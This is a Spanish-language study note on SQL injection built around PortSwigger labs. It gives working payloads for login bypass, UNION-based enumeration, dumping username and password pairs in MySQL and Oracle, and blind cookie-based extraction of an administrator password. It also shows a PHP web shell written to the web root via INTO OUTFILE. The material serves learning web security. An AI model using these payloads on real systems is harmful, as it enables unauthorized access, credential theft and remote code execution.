
Variable a cambiar --> $WORD

# Vulnerabilty in where cluase allowing retrieval of hidden data
La típica de toda la vida
**Muestra más información de la que debe**, nos podemos fijar si en la barra de desplazamiento de la derecha aumenta

````sql
$WORD' or 1=1-- -
-- o se puede poner así también:
$WORD' or 1=1#
````
Ej:
![[Pasted image 20230122161824.png]]

#### Explicación
- Con la primera comilla simple(**'**) estamos haciendo que se cierre el campo de la categoría.
- **or 1=1** --> Esto se pone porque se está indicando que es **verdadero**
- Con el comentario (**-- -**) estamos indicando que el resto de la query que se aplica **no se interprete**

Filtrame por la categoría accesorios o 1=1 (que es true)
![[Pasted image 20230122162356.png]]

# Vulnerability allowing login bypass
````sql
administrator'-- -
o
administrator'#
````


#### Explicación
- Con la comilla simple estamos cerrando el campo

- Si no esta bien sanitizado y en el panel de administrador hace una query parecida a la de la imagen para comprobar que el usuario y la contraseña sean verdadero podemos comentar el resto de la query con **-- -** o **#** 
![[Pasted image 20230122164703.png]]

Así que estamos diciendo que cuando el usuario sea válido podremos entrar

Si pide la contraseña puede que sea por la validación de la parte de front-end, se pone cualquier cosa y listo
![[Pasted image 20230122165427.png]]

# Union Attack, determing the number of columns returned by the query 

El primer paso es **averiguar el número de columnas**

Error based
````sql
$WORD' order by 100-- -
````

![[Pasted image 20230122171131.png]]


#### Explicación general
**Error based** o cuando se ve un error.
Esto se trata de causar un error que se mostrará en la página y así nosostros identificamos que es vulnerable a sqli

100 --> Es el número de columnas por el que le estamos pidiendo que ordene, en caso de no existir 100 columnas saltaría un error, de está forma vamos a ir probando **hasta que no salte error**, cuando esto sea así significa que ese es el **máximo de columnas**


**La diferencia de usar order by y del unio**n es que el union **solo se mostrara cuando es el número exacto de columnas**, mientras que el **order by** se mostrará cuando sea el número **igual que la columna o más pequeño**
También se puede con union:
````sql
$WORD' union select 1-- -
````


En este caso cuando no de error, es que esa es la cantidad de columnas existentes

Una vez conocido el total de columnas utilizamos el union:
````sql
$WORD' union select 1,2,3-- -
````
Los **números representan las columnas existentes**.
Si no funciona con números probar con **null**
![[Pasted image 20230122171929.png]]
Si esto funciona podemos empezar a introducir comandos sql en los números:
````sql
$WORD' union select version(),user()-- -
````
Puede que en algunas webs se interprete php y podamos poner comandos ("\<?php system('whoami'); ?>")

==Atención!==
**No todos los campos son válidos/inyectables** para introducir los comandos, tenemos que fuzzear  todos los campos para ver cuál es el válido

## Listar BD

**Ver las bases de datos disponibles**
````sql
$WORD' union select 1,schema_name from information_schema.schemata-- -
````
**En algunas ocasiones no deja mostrar varias filas**, para ello podemos utiliza la función concat()
````sql
$WORD' union select 1,concat(schema_name) from information_schema.schemata-- -
````

==Importante==
La función group_concat() y concat() no hacen lo mismo
- ``group_concat()`` --> combina valores en **columnas**
- ``concat()`` --> combina valores en **filas**

También podemos ir viendo los resultados uno a uno con limit:
````sql
$WORD' union select 1,schema_name from information_schema.schemata limit 0,1-- -

-- 1,1   2,1    3,1 ...
````


````sql
$WORD' union select schema_name,null from information_schema.schemata-- -
````

## Listar tablas

Una vez conozcamos las bases de datos tenemos que **averiguar las columnas/filas de estas**

Lo malo de esto es que **te representa todas las tablas de todas las bases de datos**
````sql
$WORD' union select table_name,null from information_schema.tables-- -
````

Para que no pase esto podemos utilizar where:
````sql
$WORD' union select table_name,null from information_schema.tables where table_schema='NOMBREBD'-- -
````

## Listar Columnas
Ahora que conocemos las tablas queremos **dumpear las columnas**
````sql
$WORD' union select column_name,null from information_schema.columns where table_schema='NombreBaseDeDatos' and table_name='NombreTablaAListar' -- -
````

## Ver campos y datos
Si lo permite podemos utilizar los dos campos para que un lado aparezca el nombre y en otro aparezca la contraseña:
````sql
$WORD' union select username, password from NOMBRETABLA-- -
````

Si no te lo permite y solo puedes con un campo puedes utilizar la función concat:
````sql
$WORD' union select null, concat(username,':',password) from NOMBRETABLA-- -
````

En caso de que sea otra base de datos la que contiene estos campos tendríamos que indicarlo
````sql
$WORD' union select null, concat(username,':',password) from OtraTabla.users-- -
````

### Otra forma de concatenar la información (Bypassing con pipes || )
Si no permite la anterior podemos probar así:
````sql
$WORD' union select null, username||':'||password from NOMBRETABLA-- -
````

### Bypassing cadenas de caracteres con hexadecimal
Si no deja poner una cadena de separatoria (como son los : puedes poner su valor en **hexadecimal**):
````sql
$WORD' union select null, concat(username,'0x3a',password) from users-- -
````

Si no deja representar alguna cadena de texto en otro sitio sería igual, lo podemos representar en hexadecimal, para ello podemos utilizar lo siguiente:
````sql
echo "admin" | tr -d '\n' | xxd -ps
````
Con el tr -d '\n' le estamos quitando el salto de línea para que se represente

En caso de que no dejará podriamos ir a la [cheat sheet de portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### SQLI --> RCE

**Si tenemos permiso de escritura** incluso podemos colar archivos:
````sql
$WORD' union select <?php system('whoami'); ?>,"test" into outfile "/var/www/html/COMANDO.php"-- -
````
La ruta no tiene porque ser está, esto tendríamos que investigar cual sería

## Oracle

## Ver las filas que se están usando Oracle

Es igual que sql, con la diferencia de que aquí **siempre tienes que estár apuntando a una tabla**

Para ello vamos a utilizar la tabla **dual**, que está la tienen todas las bases de datos de Oracle por defecto (es la tabla boba)
````sql
$WORD' union select null,null from dual-- -
````

## Identificar campo vulnerable y ver versión y tipo de Oracle

Sabemos que el segundo campo es el que nos va a permitir representar información así que pedimos la versión y el tipo con **banner from v$version**

````sql
$WORD' union select null,banner from v$version-- -
````

Hay otra forma de hacerlo por sí la primera no funciona:
````sql
$WORD' union select null,version from v$instance-- -
````

## Comprobación de usuario/Ver tablas existentes Oracle
Ver tablas existentes del usuario (que es una base de datos)
````sql
$WORD' union select null,table_name from user_tables-- -
````

o

ver todos los usuarios/propietarios  de todas las  tablas:

````sql
$WORD' union select null,owner from all_tables-- -
````

Ver todos las tablas incluso las creadas por defecto(esto **no nos suele interesar**)
````sql
$WORD' union select null,table_name from all_tables-- -
````


## Ver el contenido de la tabla la tabla Oracle

Una vez tengamos el usuario que es propietario de la tabla a la que queremos acceder, podemos preguntarle las filas
````sql
$WORD' union select null,table_name from all_tables where owner='NOMBREUSUARIO'-- -
````

## Ver filas/columnas Oracle

````sql
$WORD' union select null,column_name from all_tab_columns where table_name='NOMBRETABLA'-- -
````

## Ver datos y información Oracle

#### Con concat
````sql
$WORD' union select null,concat(FILA,concat(':',OTRAFILA)) from TABLA-- -
````

#### Con tuberías

````sql
$WORD' union select null,FILA || ':' || OTRAFILA from TABLA-- -
````

### Mostrar versión y tipo en MySQL y Microsoft

Lo mismo que en oracle, pero se utiliza otro comando
````sql
$WORD' union select null,@@version-- -
````

# ¿Qué es una Blind SQL | Inyección a ciegas?
A la hora de aplicar la query **que no se vea el error**

## Blind SQL - Injection with conditional responseve | conditional error

En base a lo que tu pongas algunos componentes pueden desaparecer, pero los datos no los vas a ver en la web

En este caso lo vamos a explotar en el valor de una cookie

Recomiendo utilizar **Burpsuite** 


````html
Cookie: TrackingId=F3uQfI06GsWBDMMy; session=bfNEMei3vCZyu84vqMjHZxUyWFViPbHK
````

![[Pasted image 20230125225841.png]]

En el campo TrackingId si insertamos una comilla simple al final no nos muestra el Welcome back!

````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy'; 
````

![[Pasted image 20230125225930.png]]

En caso de que comentemos el resto, esto deja de funcionar y vuelve a mostrar el mensaje Welcome Back!
Esto estaría mal:
````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy'-- -;
````

Y si probamos el típico 1=1;
````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND 1=1-- -;
````
Esto no funcionaría

En cambio si ponemos un resultado incorrecto, el mensaje vuelve a desaparecer:
````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND 2=1-- -;
````
![[Pasted image 20230125230351.png]]

**En caso de no querer comentar** podemos hacerlo de la siguiente manera:
````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND '1'='1';
````

Como sabemos que hay una comilla al final, esta nos va a cerrar nuestra propia query


Si queremos comprobarlo podemos hacer lo siguiente

````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a')='a;
````

y nos tiene que salir la frase en este caso

podemos añadir una subquery

````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a' from users limit 1)='a;
````
Seleccionamos la letra a de la tabla users (que es la que contiene los usuarios)
limit 1 --> Limitar el resultado en una única fila

En caso **de que muestre** la a significa que un valor/nombre tiene dicha letra

En caso **de que no muestre** la frase significa que no hay ningún valor/nombre con dicha letra

Ahora vamos a atentar directamente contra el usuario administrator

````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a' from users where username='administrator')='a;
````

Y igual que hemos visto anteriormente

En caso de que salga la frase (el campo) nos esta indicando que es correcto, en este caso que existe

Y si no sala es porque no existe o la query no es correcta

Una forma más cómoda de utilzarlo es con la función substring()
````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select substring(username,1,1) from users where username='administrator')='a;
````

substring(username,1,1) --> De la fila username cogeme **desde la primera posición un carácter (el mismo)**


Está query estaría verificando que el primer carácter de la contraseña de administrator sea la a

Esto lo podemos hacer de una forma más óptima si fuzzeamos dicho campo

````sql
Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select substring(password,1,1) from users where username='administrator')='a;
````

Para ello **vamos a utilizar Python**

Lo primero que vamos a hacer es mandarlo al intruder en burpsuite (Ctrl+I)

Si se abren dos pestañas la primera la podemos cerrar, es la segunda

#### Realización de ataque tipo Sniper

Arriba a la izquierda nos pregunta que ataque queremos realizar, nosotros le indicamos Sniper porque vamos a estar utilizando **un único diccionario**

[Vídeo de s4vitar](https://www.youtube.com/watch?v=C-FiImhUviM&t=5611s) --> 1:48:04

# Herramientas de automatización
Sqlmap

# Fuentes
Laboratorio Portwsigger
[S4vitar](https://www.youtube.com/watch?v=C-FiImhUviM&list=PLWys0ZbXYUy4WG1HQEtg90-bspFWjExPy)
[Cheat sheet de portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
